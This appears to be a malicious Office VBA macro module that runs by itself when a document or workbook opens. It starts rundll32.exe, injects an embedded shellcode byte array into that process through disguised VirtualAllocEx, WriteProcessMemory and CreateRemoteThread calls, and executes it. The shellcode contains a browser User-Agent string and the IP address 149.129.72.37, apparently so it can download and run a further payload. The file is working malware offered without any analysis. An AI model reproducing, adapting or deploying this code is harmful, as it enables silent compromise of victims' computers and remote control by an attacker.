Attribute VB_Name = "NewMacros"
Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

#If VBA7 Then
    Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
    Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
    Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
    Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
    Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#End If

Sub Auto_Open()
    Dim myByte As Long, myArray As Variant, offset As Long
    Dim pInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFO
    Dim sNull As String
    Dim sProc As String

#If VBA7 Then
    Dim rwxpage As LongPtr, res As LongPtr
#Else
    Dim rwxpage As Long, res As Long
#End If
    myArray = Array(-4, -24, -119, 0, 0, 0, 96, -119, -27, 49, -46, 100, -117, 82, 48, -117, 82, 12, -117, 82, 20, -117, 114, 40, 15, -73, 74, 38, 49, -1, 49, -64, -84, 60, 97, 124, 2, 44, 32, -63, -49, _
13, 1, -57, -30, -16, 82, 87, -117, 82, 16, -117, 66, 60, 1, -48, -117, 64, 120, -123, -64, 116, 74, 1, -48, 80, -117, 72, 24, -117, 88, 32, 1, -45, -29, 60, 73, -117, 52, -117, 1, _
-42, 49, -1, 49, -64, -84, -63, -49, 13, 1, -57, 56, -32, 117, -12, 3, 125, -8, 59, 125, 36, 117, -30, 88, -117, 88, 36, 1, -45, 102, -117, 12, 75, -117, 88, 28, 1, -45, -117, 4, _
-117, 1, -48, -119, 68, 36, 36, 91, 91, 97, 89, 90, 81, -1, -32, 88, 95, 90, -117, 18, -21, -122, 93, 104, 110, 101, 116, 0, 104, 119, 105, 110, 105, 84, 104, 76, 119, 38, 7, -1, _
-43, 49, -1, 87, 87, 87, 87, 87, 104, 58, 86, 121, -89, -1, -43, -23, -124, 0, 0, 0, 91, 49, -55, 81, 81, 106, 3, 81, 81, 104, -96, 91, 0, 0, 83, 80, 104, 87, -119, -97, _
-58, -1, -43, -21, 112, 91, 49, -46, 82, 104, 0, 2, 64, -124, 82, 82, 82, 83, 82, 80, 104, -21, 85, 46, 59, -1, -43, -119, -58, -125, -61, 80, 49, -1, 87, 87, 106, -1, 83, 86, _
104, 45, 6, 24, 123, -1, -43, -123, -64, 15, -124, -61, 1, 0, 0, 49, -1, -123, -10, 116, 4, -119, -7, -21, 9, 104, -86, -59, -30, 93, -1, -43, -119, -63, 104, 69, 33, 94, 49, -1, _
-43, 49, -1, 87, 106, 7, 81, 86, 80, 104, -73, 87, -32, 11, -1, -43, -65, 0, 47, 0, 0, 57, -57, 116, -73, 49, -1, -23, -111, 1, 0, 0, -23, -55, 1, 0, 0, -24, -117, -1, _
-1, -1, 47, 83, 78, 112, 75, 0, -5, 10, -16, 67, -10, 52, -100, 67, -50, -16, -78, -127, -89, 19, -118, -33, -107, 94, -5, 79, 54, 14, 86, 101, 81, -99, -31, 37, -99, -79, 70, -104, _
26, -20, 94, -99, -21, -17, -89, -94, 7, -71, 67, 77, 126, 70, -54, -38, 57, -36, 16, 108, 38, 55, -75, 78, -125, 113, -114, -108, -52, 104, -13, -56, 28, -6, 40, 72, 7, -64, -49, 122, _
123, 0, 85, 115, 101, 114, 45, 65, 103, 101, 110, 116, 58, 32, 77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 99, 111, 109, 112, 97, 116, 105, 98, 108, 101, 59, 32, 77, _
83, 73, 69, 32, 57, 46, 48, 59, 32, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 54, 46, 49, 59, 32, 87, 79, 87, 54, 52, 59, 32, 84, 114, 105, 100, 101, 110, 116, 47, _
53, 46, 48, 59, 32, 78, 80, 48, 57, 59, 32, 78, 80, 48, 57, 59, 32, 77, 65, 65, 85, 41, 13, 10, 0, -63, 51, 67, 102, 30, 110, -85, -100, 118, -39, -12, -80, 35, -49, 64, _
-10, 39, 43, -79, 109, 0, 50, -53, -126, -20, 120, -56, 123, 8, -124, 83, 99, -119, -56, 70, -119, -35, -73, 90, -110, -33, 92, -117, -106, 17, 82, -127, 3, 111, 1, 51, 118, -68, 74, -67, _
-71, 49, -101, 88, -39, 65, 40, 9, 101, -19, 69, 6, -99, -92, -21, 49, 66, -78, 105, -29, 52, 1, -122, 64, 122, -112, -6, 107, 22, -121, -65, 66, -43, 16, 12, -49, 26, -12, -18, 45, _
56, -81, 100, 116, -99, 5, 30, 72, 34, -78, -103, -71, -69, 44, -32, 65, -35, 73, 16, 35, -55, 110, 1, 119, -82, -61, -15, -46, 2, 122, -4, -123, 47, -99, 33, 4, -80, 27, -49, -4, _
28, -106, 5, 83, -42, -61, 16, 30, -96, -22, 60, 59, 107, 24, 123, -115, 7, 119, 22, -42, -118, -75, 84, 41, 24, 66, -70, 55, -127, -106, -91, -123, 21, 79, 84, -73, -115, -14, -16, 48, _
-123, 26, 39, 7, 92, 102, -97, 82, -84, -22, 55, 48, -118, -127, 68, -32, 35, -52, 86, -37, 11, -124, 17, -2, -122, 0, 104, -16, -75, -94, 86, -1, -43, 106, 64, 104, 0, 16, 0, 0, _
104, 0, 0, 64, 0, 87, 104, 88, -92, 83, -27, -1, -43, -109, -71, 0, 0, 0, 0, 1, -39, 81, 83, -119, -25, 87, 104, 0, 32, 0, 0, 83, 86, 104, 18, -106, -119, -30, -1, -43, _
-123, -64, 116, -58, -117, 7, 1, -61, -123, -64, 117, -27, 88, -61, -24, -87, -3, -1, -1, 49, 52, 57, 46, 49, 50, 57, 46, 55, 50, 46, 51, 55, 0, 111, -86, 81, -61)
    If Len(Environ("ProgramW6432")) > 0 Then
        sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
    Else
        sProc = Environ("windir") & "\\System32\\rundll32.exe"
    End If

    res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub


